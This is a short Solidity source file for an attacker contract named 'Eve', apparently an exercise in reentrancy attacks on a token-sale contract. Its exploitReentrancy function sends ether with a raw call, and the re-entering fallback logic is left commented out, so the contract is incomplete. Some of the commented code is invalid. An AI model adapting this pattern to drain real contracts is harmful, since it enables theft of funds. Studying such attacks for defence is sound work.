pragma solidity ^0.4.19;

contract Eve {

  
       bool public alreadyCalled;
       uint public tokenAmount;
   
        function Eve() public payable {}

   
    
    function exploitReentrancy(address a, uint amount) public {
       //a.call(bytes4(sha3("buyTokens(address _beneficiary)")), this.address, {value: 50});
       // tokenAmount = amount;
        a.call.value(amount)();
        //a.send(amount);
       //a.transfer(amount);
        
    }

   /* function() withdraw public onlyOwner () {
        token.transfer(msg.sender, token.balances[this.address]);
    }*/


    /*
    function() payable public {
       
        if(alreadyCalled == true) {
            return;
       }
       // msg.sender.call(bytes4(sha3("buyTokens(address _beneficiary)")), this.owner);
        msg.sender.call.value(tokenAmount)();
        alreadyCalled = true;
        
        
    }
    */
    
    
    function() public payable {
        
    }
    
    
    
}
